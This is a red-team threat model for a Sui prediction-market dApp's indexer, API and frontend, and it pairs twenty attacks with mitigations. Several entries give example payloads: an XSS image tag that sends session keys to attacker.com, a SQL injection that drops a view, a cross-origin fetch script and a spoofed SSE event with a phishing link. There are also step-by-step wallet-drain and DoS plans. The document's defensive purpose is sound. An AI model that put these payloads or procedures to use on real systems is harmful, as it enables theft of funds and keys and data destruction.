# 09 — Red Team: Indexer, API & Frontend

> Threat model for the off-chain stack: TS poll-based indexer, Postgres+TimescaleDB, Redis pubsub, Fastify REST/SSE API, Vite/React frontend with Slush wallet, planned session keys.
>
> **Severity:** Critical = direct fund loss. High = privacy breach / mass identity harm. Medium = trust erosion. Low = annoyance.
>
> The chain is the source of truth. Everything below is a way to make traders behave as if it isn't.

---

## A1 — Indexer-lag arbitrage against retail

**Severity:** High.

**Setup.** Indexer polls every 500 ms with a 1-checkpoint buffer (~250 ms); design budgets ~625 ms p50, 1.4 s p95. Retail reads through it. An attacker reading directly from a private fullnode sees `BarrierTouched` / `ObservationRecorded` strictly before retail's chart updates.

**Step-by-step.** (1) Subscribe to a private fullnode. (2) Instant a barrier touch is observed on SUI-USD, push opposite-side trades on a correlated SP500 market — retail still sees stale CPMM prices. (3) Dump favourable side onto AMM at lagged price, exit before retail's chart catches up.

**Impact.** Every position is collateralised, but retail systematically gets the worse side of multi-asset moves. Wick's tape becomes a leak indicator. Retail leaves.

**Existing controls.** None — doc 09 §4's checkpoint-buffer is a *floor* on user-visible lag, not a ceiling on attacker advantage.

**Mitigation.** Surface `last_oracle_observation_ms` in `/v1/markets/:id/quote` and **revert on-chain** in `buy_touch` if `clock - last_observation > MAX_QUOTE_STALENESS` (forces attacker to also push a fresh observation). Optional: 200 ms settling auction per oracle observation so all trades that arrive in-window clear at one price. Document that Wick is not MEV-protected — honesty beats discovered-by-trader.

---

## A2 — Reorg-lite via single-fullnode partition

**Severity:** Medium.

**Setup.** Doc 09 §4: the indexer reads from one public fullnode. The cursor is `(tx_digest, event_seq)` — advances monotonically by event-sort on that fullnode. If that fullnode briefly partitions and a *different* fullnode finalises tx `T_a` first, then the public node catches up, the indexer's cursor query (`cursor=last_event_id`) can skip past `T_a` because the sort key is past where `T_a` lives.

**Step-by-step.** (1) Wait for routine Mysten public-RPC restart/brownout (testnet: monthly). (2) Submit `T_a` against a different fullnode → finalises in checkpoint `C_n`. (3) Submit `T_b` against Mysten public → finalises in `C_{n+1}`, indexer cursor advances. (4) Mysten catches up; indexer never re-fetches `C_n`'s events from this RPC.

**Impact.** Position `T_a` on-chain and redeemable; indexer's `positions` table never sees it. UI says "no positions." User thinks trade failed, repeats it, doubles stake. Silent divergence from chain truth.

**Existing controls.** §9 nightly determinism CI catches replay drift after the fact, not in production.

**Mitigation.** Multi-RPC quorum: query 3 fullnodes, advance cursor only when ≥2 agree on the event set per checkpoint range. Drive the cursor by **checkpoint number**, not by event ID. Daily reconciliation: sample `getOwnedObjects` for known users, alarm on drift.

---

## A3 — Phishing clone with auto-connecting Slush

**Severity:** Critical.

**Setup.** Demo script ships a QR to `wick.markets`. Two months later, organic search for "wick markets sui" lands on `wick-markets.io` — registered the morning of demo day by an attacker. Pixel-perfect clone. Only the PTB construction differs.

**Step-by-step.** (1) Attacker forks the open-source frontend, proxies the indexer URL through their own server so live data renders. (2) Slush returns the user's address on `connect` without a per-domain confirmation. (3) User clicks `TAP UP`. Clone builds a PTB with call #1 = `pay_to_attacker(user_balance)` and call #2 = `wick::market::buy_touch` (so the wallet preview shows the recognisable signature). (4) User glances, sees `buy_touch` and a small SUI amount, signs. Drained.

**Impact.** Total wallet drain on a single signature. Most likely fund-loss vector in production.

**Existing controls.** Slush's wallet UX — optimised for one-click, not multi-call obfuscation.

**Mitigation.** Display the cryptographic hash of the PTB the user is about to sign in the Wick UI *and* deep-link it to Slush so the user compares. Pre-publish a manifest of expected Move call signatures per UI action; reject if the PTB doesn't match. File a Slush integration request: hard-prompt when a PTB has multiple calls to multiple distinct package IDs. Register defensive domains (`.io`, `.app`, `.xyz`). Pin one canonical URL on every channel.

---

## A4 — Session-key escape via self-counterparty trade

**Severity:** Critical. **This is the headline session-key risk.**

**Setup.** Plan: session keys can `trade` but not `withdraw`. Trader signs once, subsequent positions auto-sign for 30 minutes. But trading a binary option **moves collateral into a vault** that a counterparty can also be in. If the user can be on both sides — or coordinate two accounts — "no withdraw" is *not* "no value transfer."

**Step-by-step.** (1) Phish a session-key signature for victim `V` (much easier than master-key phishing because the prompt sells "lasts 30 minutes"). (2) Attacker controls account `A`. (3) On Market M, attacker uses `V`'s session key to `buy_no_touch(M, max_stake)` for a market 99% certain to TOUCH (barrier 1 tick away, 28s left). (4) Attacker uses `A` to `buy_touch(M, matching_stake)` cheap — AMM has just been pushed adversely against TOUCH. (5) Market settles TOUCH. `V` loses, `A` redeems. **Value transferred from `V` to `A` using only "trade" permissions.**

**Impact.** Session keys silently expand the surface from "one transaction approval" to "30 minutes of unattended trading." Single XSS, single CSRF, single phishing prompt = drained over the next half-hour. The "can't withdraw" framing misleads — losing intentionally to a known counterparty *is* a withdrawal.

**Existing controls.** None — session keys not yet shipped. Design moment.

**Mitigation.** Per-session caps in the on-chain session object: `max_stake_per_market`, `max_total_stake_per_session`, `max_loss_per_session`. Reject TOUCH+NO_TOUCH pairs in the same market within `T` seconds where one side traces to a session key. 5-second public mempool window for session-keyed trades. Cap session lifetime at 5 minutes, not 30. UI kill-switch revokes all active sessions on-chain. **Do not ship session keys before tournaments** — tournaments are exactly where collusion pays.

---

## A5 — Wallet-prompt confusion via PTB blindness

**Severity:** High (escalates A3, A4).

**Setup.** Slush shows users a list of Move calls with package addresses and arguments. Most users — even experienced ones — cannot read this. Standard heuristic: "it says `buy_touch` and a small SUI amount, click."

**Step-by-step.** (1) Malicious dApp builds a PTB: call #1 = `wick::market::buy_touch(market_a, 0.01 SUI)` (cheap, recognisable), call #2 = `wick::market::transfer_position(any_user_position, attacker_addr)`. (2) User glances at the first line, signs. (3) All of the user's existing positions on Wick now belong to the attacker — including profitable ones about to be redeemed.

**Impact.** Theft of all positions; no transfer signature ever consciously authorised.

**Existing controls.** Slush's call list. Inadequate.

**Mitigation.** Wick-specific PTB schema enforced in the frontend: always exactly N Move calls in known order; anything else rejected pre-sign. Highlight ownership-moving calls in red (Slush integration). Session keys (A4) commit at creation time to a **whitelist of permitted entry-function signatures** — `transfer_position` never signable.

---

## A6 — XSS via NFT badge name/description

**Severity:** High.

**Setup.** §2.8 emits `BadgeAwarded`. Doc 08 describes Badge as a Display NFT with name/description. Endpoint `/v1/badges/:addr` returns these. Frontend's badge gallery and leaderboard tooltips render them. Any rich-tooltip lib that allows HTML, or any markdown renderer with raw-HTML enabled, opens an XSS path.

**Step-by-step.** (1) Attacker mints a badge whose `name` field carries `<img src=x onerror=fetch('https://attacker.com/'+localStorage.getItem('session_key'))>`. (2) Indexer stores it raw in `events.payload`. (3) Victim views the leaderboard; React renders the badge name through an unsanitised tooltip path. (4) Payload runs in victim's origin and exfiltrates session-key signatures from `localStorage`.

**Impact.** Mass session-key theft (compounds A4) once a single popular leaderboard view is poisoned. Cross-user XSS at the leaderboard — every user every page load.

**Existing controls.** React text rendering auto-escapes. Rich tooltips, markdown, SVG badge images are common slip points.

**Mitigation.** Strict CSP: `default-src 'self'; img-src 'self' data:; script-src 'self'; connect-src 'self' https://api.wick.markets https://fullnode.testnet.sui.io`. Sanitise all string fields from on-chain events at the indexer boundary, not the client. Whitelist badge `name` to `[A-Za-z0-9 _-]{1,32}` at the Move-side mint path. Render badge images from a canonical CDN under our control, never from a URL embedded in metadata.

---

## A7 — Spoofed `BadgeAwarded` via fuzzy projector dispatch

**Severity:** Medium (combines with A6 for high).

**Setup.** §4 polls events filtered by `packageId` (good). But projectors dispatch by `event_type` string. Anyone can deploy a Move package with a struct named `tournament::BadgeAwarded`. If the projector match is `endsWith('::tournament::BadgeAwarded')`, fake events are ingested.

**Step-by-step.** (1) Attacker deploys a package with `struct BadgeAwarded has copy, drop { user, badge_kind, awarded_at_ms, source_event_digest }`. (2) Calls a function that emits it. (3) Even if the indexer's *RPC filter* is by `packageId`, any local replay or backfill from raw archives that uses a fuzzy projector key picks it up. (4) Combine with A6 if the badge name is also injectable.

**Impact.** Fake badges in leaderboards. False reputation. Privilege escalation if badges gate features (tournament eligibility, fee tiers).

**Existing controls.** §4 filters at the RPC; projector-side matching unspecified.

**Mitigation.** Projector dispatch keys the **full type tag**: `${packageId}::${module}::${struct}` — no suffix matching, ever. Versioned package upgrades append to an allow-list in `deployments/testnet.json`. CI check: `events.event_type` regex must start with one of the known package IDs.

---

## A8 — SSE backpressure DoS via slow-loris

**Severity:** Medium (availability).

**Setup.** §7 budgets 1k concurrent dashboard viewers and 60 ev/s. The throttle (one tick per oracle per 250 ms) is *write-side*. Slow-loris readers — many connections that read a byte every 30s — fill Node's per-connection event buffers and OOM the SSE process.

**Step-by-step.** (1) Open 10k SSE connections to `/v1/markets/:id/ticks/stream` from a small botnet. (2) Each reads 1 byte/30s. TCP buffers fill, back-pressure the SSE writer. (3) RAM blows up; process OOM-killed. (4) Pubsub messages dropped between OOM and restart never redeliver (Redis pubsub is fire-and-forget). (5) During outage, traders' charts are frozen — they place blind trades against AMM prices that move without UI feedback.

**Impact.** Total SSE outage at low attacker cost. Combine with A1: while honest users stare at frozen charts, attacker (direct RPC) trades the pre-tick state.

**Existing controls.** None stated.

**Mitigation.** Per-IP and per-account SSE connection cap (e.g. 3 concurrent). Server-side absolute write budget per connection: kill any whose write buffer exceeds 64 KB. Use HTTP/2 server push or WebSocket multiplexing so 1k clients map to fewer TCP conns. Front the SSE on Cloudflare/Vercel Edge — they absorb slow-loris at the edge. Dedicated SSE pod with strict resource quotas, not co-located with the API.

---

## A9 — Redis pubsub exhaustion via free event spam

**Severity:** Medium.

**Setup.** §4: `redis.publish('wick:events', JSON.stringify(page.data))` for every projected event. If the indexer ingests a flood of legitimate-looking events (someone pays the gas), Redis pubsub fan-out scales linearly with subscribers × events.

**Step-by-step.** (1) Attacker deploys a Move package that calls `random_walk_driver::tick` repeatedly in one PTB on an attacker-owned market. (2) Sui PTB gas limit is large — single PTB emits ~1000 events for ~$0.01 testnet gas. (3) At 60 PTBs/s, attacker pushes 60k ev/s into the indexer — 1000× the §7 budget. (4) Postgres absorbs (per the doc); Redis pubsub does not — `client-output-buffer-limit pubsub` kicks in and disconnects slow subscribers. (5) Frontend chart shows minutes-old data; trades placed against stale CPMM state.

**Impact.** Sustained chart blindness. Compounds A1 to a sustained mispricing-extraction operation.

**Existing controls.** §7 mentions Vercel Queues as a *future* scaling lever for `path_ticks` writes, not for Redis fan-out.

**Mitigation.** Filter at publish boundary: only publish events from markets in an `active` allow-list. Unknown market's first event triggers a 30s moderation hold. Per-package events-per-minute budget; pause projection (queue to backfill table) past a threshold. Charge a small protocol fee at `path_observation::record_tick` time so spamming costs more than gas. Separate Redis channels per market — subscribers only get watched markets.

---

## A10 — IDOR-style aggregation: `/v1/positions?owner=`

**Severity:** Medium (privacy breach).

**Setup.** Endpoint #8 has no auth row. Positions and addresses are public on-chain — but **aggregating** them with PnL totals turns "public but obscure" into "indexed and searchable."

**Step-by-step.** (1) Scrape Twitter/Discord for known Wick addresses (people who screenshot wins). (2) Hit `/v1/users/:addr/pnl?window=24h` and `/v1/positions?owner=` for each. (3) Build `{twitter_handle: total_loss}` DB; sell to a competitor for targeted ads ("you lost 12 SUI on Wick last week — try us instead"). (4) Build a list of high-PnL traders, reverse-engineer entry timing, copy-trade or front-run.

**Impact.** Targeted phishing of users who lost money. Doxxing of pseudonymous traders. Brand damage. Polymarket has been criticised for the same — Wick should learn from that, not repeat it.

**Existing controls.** None.

**Mitigation.** Per-(IP, target) rate limit (e.g. 10 req/min). Per-user opt-in `users.privacy_flag` on-chain — when set, return only the owner's own positions to a signed request. Cache aggregations and return only bucketed PnL ranges (`'+10 to +100 SUI'`) to anonymous callers. Privacy banner on first connect: "Your positions and PnL are public on Sui."

---

## A11 — Cache-poisoned leaderboard timing exploit

**Severity:** Medium.

**Setup.** §3 `leaderboard_24h` materialised view refreshes every 60 s. Fronted by any CDN with even 30s TTL → 90s stale. Tournaments run 5 minutes.

**Step-by-step.** (1) Attacker enters tournament. At T+150s, cached leaderboard says rank 3. Chain says rank 2. (2) Attacker — running a private indexer — has a 90s preview of leaderboard moves and times risk accordingly. (3) Other entrants making decisions on stale rank play suboptimally and lose money they might have kept.

**Impact.** Two-tiered tournament outcomes — players with private indexers always edge those reading the public API. Tournament fairness undermined silently because the chain settles correctly; only the *information environment* is unfair.

**Existing controls.** "Refreshed every 60s" is a floor on staleness.

**Mitigation.** Tournament-specific leaderboard refreshed every 1s, computed incrementally on every `PositionRedeemed`. `Cache-Control: no-store` on tournament leaderboard endpoints. UI renders exclusively from SSE during active tournaments, not from the REST endpoint.

---

## A12 — Tournament prize claim race / double-pay window

**Severity:** Critical (direct fund loss for protocol).

**Setup.** §2.8 `TournamentSettled` carries `winners` and `prizes`. UI shows "Claim Prize" buttons. 100 winners click simultaneously. On-chain `tournament::claim` should be idempotent. The API and UI are the soft underbelly.

**Step-by-step.** (1) Tournament settles. (2) UI shows claim button by checking `/v1/tournaments/:id` for the user's address in `winners`. (3) If the projector marks `tournament_results.claimed = true` *optimistically* on PTB submission, the API tells a second attempt "already claimed" while the chain hasn't finalised yet. If the chain tx then *fails*, the user can't re-claim — funds locked past the claim deadline → reverts to treasury. (4) Reverse: if the projector marks claimed only *after* `PrizeClaimed`, but the UI optimistically grays the button — user assumes claimed but tx silently failed (no SSE event for failed tx).

**Impact.** Either: protocol pays a winner twice (insolvency on a tournament-by-tournament basis) or winner is locked out. Both critical for trust.

**Existing controls.** None at the API layer.

**Mitigation.** Indexer sets `claimed = true` only on confirmed `PrizeClaimed` event with a non-null tx_digest. UI exposes three claim states: `claimable`, `pending` (tx submitted, indexer hasn't seen — retry after 30s), `claimed`. Move-side `claim` aborts if `entry.claimed_at_ms != 0`; aborts if `now > tournament.claim_deadline`; emits `PrizeClaimed` exactly once. Test idempotency in `move/tests/`. Server-side Redis lock per `(tournament_id, address)` so a buggy double-tap doesn't submit two PTBs.

---

## A13 — CORS misconfiguration leaking trade history cross-origin

**Severity:** High.

**Setup.** Fastify-on-Vercel often defaults to permissive CORS so dev frontends can hit the API. If `Access-Control-Allow-Origin: *` is left in production, any site the user visits can fetch their trade history.

**Step-by-step.** (1) Attacker site embeds `<script>fetch('https://api.wick.markets/v1/positions?owner=' + USER_ADDRESS).then(r => r.json()).then(send)</script>`. (2) Either previously phished the address, or fingerprinted via cross-reference. (3) Server returns positions with `Access-Control-Allow-Origin: *`; browser hands the response to the attacker site.

**Impact.** Compounds A10 (privacy) and powers A3 (knowing a user's positions lets the attacker craft a personalised "your position is in danger, click to redeem" email).

**Existing controls.** Implementation-dependent.

**Mitigation.** Production CORS allow-list: only `wick.markets` and named Vercel preview patterns. Public endpoints (`/v1/leaderboard`) may use `*` but never with credentials. Switch all auth to bearer tokens in `Authorization` headers so cross-origin reads can't ride existing sessions.

---

## A14 — SQL injection via unparameterised `/v1/leaderboard?window=`

**Severity:** Critical.

**Setup.** Endpoint #13 takes `window`. The natural implementation builds `WHERE minted_at_ms > now() - INTERVAL '${window}'` — string concat, classic injection.

**Step-by-step.** (1) `?window=24h'; DROP MATERIALIZED VIEW leaderboard_24h; --` returns 500 or worse, succeeds. (2) Combine with `pg_read_server_files()` → extract `.env`, RPC keys, admin DB creds. (3) Worst case: attacker writes to `positions` table and credits themselves a fictitious 1M SUI PnL. WICK staking rewards are computed off leaderboard rank — this becomes a real-money exploit.

**Impact.** Full off-chain compromise. On-chain unaffected (good), but every off-chain feature — leaderboards, badges, tournament rankings, WICK reward distribution — is now attacker-controlled.

**Existing controls.** Implementation-dependent. Fastify schema validation would help; doc 09 doesn't mention it.

**Mitigation.** Every query param goes through Fastify JSON-schema validation; enum or strict regex required (`window: enum(['24h', '7d', '30d'])`). All SQL parameterised. ESLint rule `no-template-literals-in-sql`. Postgres role for the API: SELECT-only on derived tables, no DDL. Indexer is a separate role with DML. Run `sqlmap` against staging in CI.

---

## A15 — SSE injection of fake "tournament won" notification

**Severity:** High.

**Setup.** SSE endpoint #23 unauthenticated, format `event: TournamentSettled\ndata: {...}`. Attacker on the same wifi (hackathon, coffee shop) MITMs.

**Step-by-step.** (1) Rogue cert / SSL-strip on shared wifi. (2) Inject `event: TournamentSettled\ndata: { winners: ['<victim>'], prizes: [1000000000], claim_url: 'https://attacker.com/claim?token=...' }`. (3) UI shows "You won 1000 SUI!" toast. Click → attacker site styled like Wick's claim flow. (4) Attacker site asks user to "approve the claim" — actually a `transfer_position` PTB (A5).

**Impact.** High-conversion phishing because the user *just played* a tournament and is primed to expect a winnings notification.

**Existing controls.** HTTPS prevents naive MITM. Doesn't prevent hostile coffee-shop SSL-strip if the user clicks through, or compromised wallet extension acting as MITM.

**Mitigation.** Sign every SSE payload with a server-side key; frontend verifies before rendering. Never embed URLs in event data — UI constructs claim URLs from a hardcoded route + `tournament_id`. Strict CSP `connect-src` allow-list. Every notification has a "verify on chain" button that re-fetches from `suix_queryEvents` directly.

---

## A16 — Indexer-of-record drift from publish-then-commit ordering

**Severity:** High (silent wrong-state for power users).

**Setup.** §9 nightly determinism CI catches indexer-bug drift. It does not catch operational drift: live process diverging from chain for hours before nightly catches up. The crash window between Postgres commit and Redis publish is the gap.

**Step-by-step.** (1) Indexer projects an event into Postgres tx, commits, then calls `redis.publish`. (2) Process killed by OOM after the commit but before the publish fires. (3) Cursor is committed; pubsub never fired; SSE clients never see the event. (4) On-chain and Postgres agree, but every connected SSE client has a stale in-memory view that *thinks* it's current. (5) User refreshes → correct state. User who never refreshes → stale for hours, decides on it.

**Impact.** Long-tail wrong-state for power users. Bad PnL. Disputes. Trust loss.

**Existing controls.** SSE has `Last-Event-ID` (§5). Helps only if the client reconnects — which it doesn't if the connection is alive but the publish was dropped.

**Mitigation.** Heartbeat over SSE every 5s with the latest projected event ID; client reconnects if behind. Publish to Redis from a transactional outbox (atomic to the Postgres tx) so publish-or-retry is guaranteed. `/v1/health` reports cursor lag; UI banners if `lag > 5s`. Client periodically hashes visible market state and diffs against a fresh GET; reload on diff.

---

## A17 — Replay of session-key signature against a different op

**Severity:** Critical (depends on session-key spec, but the structural risk is real).

**Setup.** Session keys (planned). If the signature scope isn't strictly bound to the operation, an attacker who captures one signature replays it for a different op.

**Step-by-step.** (1) User signs a session key with payload `{ session_pubkey, expiry }` — does not include allowed operations. (2) Attacker observes a trade tx on-chain, extracts the session signature. (3) Constructs a `cancel_position` or `transfer_position` PTB signed by the session key. (4) If the on-chain validator accepts any signature from the session key for any user-owned-object op, the attacker can move objects.

**Impact.** Identical end-state to A4; lower-level technical version.

**Existing controls.** Not yet shipped. Design moment.

**Mitigation.** Session-key signed payload commits to (a) explicit allowed entry-function signatures, (b) max stakes, (c) market IDs or "any market created by package P at version V", (d) expiry, (e) per-session monotonic nonce. Use Sui multisig with the session key as one signer and a gating contract as another that enforces (a)–(e) on-chain.

---

## A18 — Badge-criteria-as-dark-pattern

**Severity:** Low (technical), real harm at scale.

**Setup.** "You're 1 trade from your First Wick badge" nudges dust trades — small, often -EV trades made to unlock cosmetics. At scale it becomes a manipulative incentive.

**Step-by-step.** (1) New user joins, places one trade, loses. (2) UI shows "1 of 3 trades for First Wick badge." (3) User makes 2 more trades just to unlock — both losses, made for badge reasons not market reasons. (4) Aggregate: badge mechanics drive measurable -EV trade volume, positive for LP, negative for users.

**Impact.** Reputational. Easy headline: "Wick uses dark patterns to get retail to lose money on cosmetics." Harder to answer than free-to-play because real money is at stake.

**Existing controls.** None — the gamification spec actively endorses the pattern.

**Mitigation.** Limit badge nudges to milestones the user would reach anyway. Never display "you are N trades away from X" — only what they have already achieved. Add a "responsible trading" toggle that hides all gamification UI. Document the consideration up-front; proactive transparency beats post-hoc apology.

---

## A19 — Frontend secret leakage via `VITE_*` env vars

**Severity:** Medium.

**Setup.** Vite exposes `import.meta.env.VITE_*` to the browser bundle. Common foot-shoot: paid-tier RPC keys named `VITE_SUI_RPC_URL=https://blastapi.io/sui?key=SECRET`.

**Step-by-step.** (1) Developer adds the key locally to skip public testnet rate limits. (2) Builds and deploys; the key is baked into `dist/assets/index-*.js`. (3) Attacker greps the bundle for `blastapi.io`, finds the key. (4) Wick's quota burns → degrades indexer (same RPC) → wider outage.

**Impact.** Cost (low) + indexer availability (medium) + opens spoofing if the key buys access to a node operator the attacker also uses.

**Existing controls.** Vite convention: `VITE_` is explicitly client-exposed. Discipline-only.

**Mitigation.** CI grep step: fail build if any `VITE_*` contains `key=`, `secret`, `token`, `private`. All authenticated RPC goes through a server-side proxy. `npm run build` includes a post-step that scans `dist/` for known sensitive substrings.

---

## A20 — Demo-day live-event attack: clone + RPC DoS

**Severity:** Critical (highest visibility loss).

**Setup.** Doc 10 §6 backups handle individual failures (Pyth stale, Predict paused, RPC slow). None assume an active adversary picking the worst moment. The demo-day attacker doesn't need to break the protocol — just embarrass it.

**Step-by-step.** (1) Attacker registers `wick-markets.io` with a clone (per A3). (2) During the demo, DDoSes the public Sui testnet RPC — cheap, public, well-known target. Indexer falls behind, frontend chart freezes. (3) Presenter pivots to Arcade; works because oracle is internal. (4) After the demo, judges scan the QR. Booth wifi: attacker poisons mDNS so casual phone scans land on the clone with similar-font typo-squat (`wíck.markets`). (5) Judge plays "Wick" for two minutes on the clone. Walks away thinking Wick is rugged.

**Impact.** Reputation kill on demo day. Worse than any technical failure because the *judge thinks they used the real product*.

**Existing controls.** None addressing live-event-attack.

**Mitigation.** QR resolves through a short link on a domain you fully control (`wick.so/demo`). Booth wifi tethered from the presenter's phone, not venue wifi (no rogue mDNS). Closer slide prints the canonical URL in 60pt next to the QR so judges can compare. Submit `wick.markets` to the Sui ecosystem dApp registry pre-demo so wallets recognise it. Teammate physically checks the first three judges' phones for the right URL before letting them trade.

---

## Priority — five things to fix before mainnet

1. **A4 (session-key escape)** — redesign or postpone the feature.
2. **A3 (phishing clone)** — register defensive domains and ship the PTB-hash display.
3. **A14 (SQL injection)** — Fastify schema validation and parameterised queries from day one.
4. **A6 (XSS via badge)** — strict CSP plus sanitisation at the indexer ingest boundary.
5. **A12 (claim race)** — atomic on-chain claim with indexer-confirmed digest before UI updates.

Everything else is hardening. These five are protocol-survival.
